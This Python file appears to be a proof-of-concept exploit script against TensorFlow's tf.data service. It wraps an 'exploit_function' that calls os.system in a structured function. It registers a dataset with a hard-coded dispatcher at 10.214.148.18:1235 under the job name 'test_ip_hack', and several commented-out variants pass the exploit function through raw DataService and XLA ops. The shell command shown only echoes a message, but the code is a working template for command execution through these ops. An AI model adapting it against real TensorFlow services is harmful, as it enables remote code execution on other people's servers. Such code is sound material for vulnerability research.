import tensorflow as tf

from tensorflow.python.data.experimental.ops import compression_ops
from tensorflow.python.data.ops import structured_function
from tensorflow.python.framework import dtypes
from tensorflow.python.framework import tensor_spec
from tensorflow.python.data.experimental.service.server_lib import DispatcherConfig



from tensorflow.python.ops.gen_experimental_dataset_ops import register_dataset, register_dataset_v2
dataset = tf.data.Dataset.from_tensor_slices([1, 2, 3, 4, 5])

# dispatcher = tf.data.experimental.service.DispatchServer(config=tf.data.experimental.service.DispatcherConfig(port=1235))
# print("config = ", dispatcher._config)
# dispatcher_address = dispatcher.target.split("://")[1]
# worker = tf.data.experimental.service.WorkerServer(
#     tf.data.experimental.service.WorkerConfig(
#         dispatcher_address=dispatcher_address))
# print("dataset = ", dataset)
# print("dispatcher.target = ", dispatcher.target, type(dispatcher.target))
# print("try to link to 10.214.148.18:1235 ...")

resource_handler = tf.raw_ops.VarHandleOp(dtype=tf.int64, shape = 1)
# result = tf.raw_ops.DataServiceDataset(
#     dataset_id=1,
#     processing_mode="parallel_epochs",
#     address="10.214.148.18:{}".format(1235),
#     protocol="grpc",
#     job_name="test_ip_hack",
#     max_outstanding_requests=10,
#     iteration_counter=resource_handler,
#     output_types=[tf.int64],
#     output_shapes=[1]
# )

# result = tf.raw_ops.DataServiceDatasetV2(
#     dataset_id=1,
#     processing_mode="parallel_epochs",
#     address="10.214.148.18:{}".format(1235),
#     protocol="grpc",
#     job_name="test_ip_hack",
#     consumer_index=1,
#     num_consumers=10,
#     max_outstanding_requests=10,
#     iteration_counter=resource_handler,
#     output_types=[tf.int64],
#     output_shapes=[1]
# )

uncompress_func = structured_function.StructuredFunctionWrapper(
        lambda x: compression_ops.uncompress(x, output_spec=tensor_spec.TensorSpec(shape=(), dtype=dtypes.variant)),
        transformation_name="DataServiceDataset.uncompress()",
        input_structure=tensor_spec.TensorSpec(shape=(), dtype=dtypes.variant))

def exploit_function(x, y, z):
    import os
    os.system("echo 'I have hack you!'")
    return x

exploit_func = structured_function.StructuredFunctionWrapper(
        lambda x: exploit_function(x, y=x, z=x),
        transformation_name="Exploit()",
        input_structure=tensor_spec.TensorSpec(shape=(), dtype=dtypes.variant))

# print(dir(uncompress_func))
# print(uncompress_func.function)

# print(exploit_func.function)

# from tensorflow.compiler.jit.ops import xla_ops
# xla_ops.xla_launch_v2(
#     args=[resource_handler],
#     Tresults=[dtypes.int32],
#     constants=[0],
#     resources=[0],
#     function=exploit_func.function
# )

# result = tf.raw_ops.DataServiceDatasetV3(
#     dataset_id=1,
#     processing_mode="parallel_epochs",
#     address="10.214.148.18:{}".format(1235),
#     protocol="grpc",
#     job_name="test_ip_hack",
#     consumer_index=1,
#     num_consumers=10,
#     uncompress_fn=uncompress_func.function,
#     max_outstanding_requests=10,
#     iteration_counter=resource_handler,
#     output_types=[tf.int64],
#     output_shapes=[1]
# )
dataset_id = register_dataset_v2(dataset=dataset._variant_tensor, address="10.214.148.18:{}".format(1235), protocol="grpc", external_state_policy=0)
result = tf.raw_ops.DataServiceDatasetV4(
    dataset_id=dataset_id,
    processing_mode="parallel_epochs",
    address="10.214.148.18:{}".format(1235),
    # address=dispatcher_address,
    protocol="grpc",
    job_name="test_ip_hack",
    consumer_index=1,
    num_consumers=10,
    uncompress_fn=uncompress_func.function,
    max_outstanding_requests=10,
    iteration_counter=resource_handler,
    output_types=[tf.int64],
    uncompress=False,
    output_shapes=[1]
)

print(result)


